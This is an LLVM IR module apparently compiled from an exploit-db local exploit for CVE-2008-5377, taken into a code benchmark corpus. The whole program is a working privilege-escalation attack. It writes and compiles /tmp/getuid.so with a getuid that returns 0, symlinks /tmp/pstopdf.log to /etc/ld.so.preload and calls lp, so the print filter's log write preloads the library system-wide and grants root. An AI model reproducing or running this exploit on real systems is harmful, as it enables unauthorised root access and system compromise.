; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/local/extr_7550.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/local/extr_7550.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i32 }

@.str = private unnamed_addr constant [22 x i8] c"/tmp/cve-2008-5377.ps\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.2 = private unnamed_addr constant [42 x i8] c"error: cannot open /tmp/cve-2008-5377.ps\0A\00", align 1
@.str.3 = private unnamed_addr constant [59 x i8] c"%%!PS-Adobe-2.0 EPSF-2.0\0A( /tmp/getuid.so ) CVE-2008-5377\0A\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"/tmp/getuid.c\00", align 1
@.str.5 = private unnamed_addr constant [34 x i8] c"error: cannot open /tmp/getuid.c\0A\00", align 1
@.str.6 = private unnamed_addr constant [25 x i8] c"int getuid(){return 0;}\0A\00", align 1
@.str.7 = private unnamed_addr constant [43 x i8] c"cc -shared /tmp/getuid.c -o /tmp/getuid.so\00", align 1
@.str.8 = private unnamed_addr constant [37 x i8] c"error: cannot compile /tmp/getuid.c\0A\00", align 1
@.str.9 = private unnamed_addr constant [17 x i8] c"/tmp/pstopdf.log\00", align 1
@.str.10 = private unnamed_addr constant [40 x i8] c"error: /tmp/pstopdf.log already exists\0A\00", align 1
@.str.11 = private unnamed_addr constant [19 x i8] c"/etc/ld.so.preload\00", align 1
@.str.12 = private unnamed_addr constant [62 x i8] c"error: cannot symlink /tmp/pstopdf.log to /etc/ld.so.preload\0A\00", align 1
@.str.13 = private unnamed_addr constant [27 x i8] c"lp < /tmp/cve-2008-5377.ps\00", align 1
@.str.14 = private unnamed_addr constant [46 x i8] c"error: could not print /tmp/cve-2008-5377.ps\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca %struct.stat, align 4
  store i32 0, i32* %1, align 4
  %5 = call i32* @fopen(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i32* %5, i32** %3, align 8
  %6 = load i32*, i32** %3, align 8
  %7 = icmp ne i32* %6, null
  br i1 %7, label %10, label %8

8:                                                ; preds = %0
  %9 = call i32 @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.2, i64 0, i64 0))
  br label %52

10:                                               ; preds = %0
  %11 = load i32*, i32** %3, align 8
  %12 = call i32 @fprintf(i32* %11, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.3, i64 0, i64 0))
  %13 = load i32*, i32** %3, align 8
  %14 = call i32 @fclose(i32* %13)
  %15 = call i32* @fopen(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i32* %15, i32** %3, align 8
  %16 = load i32*, i32** %3, align 8
  %17 = icmp ne i32* %16, null
  br i1 %17, label %20, label %18

18:                                               ; preds = %10
  %19 = call i32 @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.5, i64 0, i64 0))
  br label %52

20:                                               ; preds = %10
  %21 = load i32*, i32** %3, align 8
  %22 = call i32 @fprintf(i32* %21, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.6, i64 0, i64 0))
  %23 = load i32*, i32** %3, align 8
  %24 = call i32 @fclose(i32* %23)
  %25 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.7, i64 0, i64 0))
  store i32 %25, i32* %2, align 4
  %26 = load i32, i32* %2, align 4
  %27 = call i64 @WEXITSTATUS(i32 %26)
  %28 = icmp ne i64 %27, 0
  br i1 %28, label %29, label %31

29:                                               ; preds = %20
  %30 = call i32 @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.8, i64 0, i64 0))
  br label %52

31:                                               ; preds = %20
  %32 = call i32 @unlink(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.9, i64 0, i64 0))
  %33 = call i32 @stat(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.9, i64 0, i64 0), %struct.stat* %4)
  store i32 %33, i32* %2, align 4
  %34 = load i32, i32* %2, align 4
  %35 = icmp ne i32 %34, -1
  br i1 %35, label %36, label %38

36:                                               ; preds = %31
  %37 = call i32 @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.10, i64 0, i64 0))
  br label %52

38:                                               ; preds = %31
  %39 = call i32 @symlink(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.9, i64 0, i64 0))
  store i32 %39, i32* %2, align 4
  %40 = load i32, i32* %2, align 4
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %44

42:                                               ; preds = %38
  %43 = call i32 @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.12, i64 0, i64 0))
  br label %52

44:                                               ; preds = %38
  %45 = call i32 @system(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.13, i64 0, i64 0))
  store i32 %45, i32* %2, align 4
  %46 = load i32, i32* %2, align 4
  %47 = call i64 @WEXITSTATUS(i32 %46)
  %48 = icmp ne i64 %47, 0
  br i1 %48, label %49, label %51

49:                                               ; preds = %44
  %50 = call i32 @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.14, i64 0, i64 0))
  br label %52

51:                                               ; preds = %44
  br label %52

52:                                               ; preds = %51, %49, %42, %36, %29, %18, %8
  %53 = call i32 @unlink(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0))
  %54 = call i32 @unlink(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @fprintf(i32*, i8*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i64 @WEXITSTATUS(i32) #1

declare dso_local i32 @unlink(i8*) #1

declare dso_local i32 @stat(i8*, %struct.stat*) #1

declare dso_local i32 @symlink(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
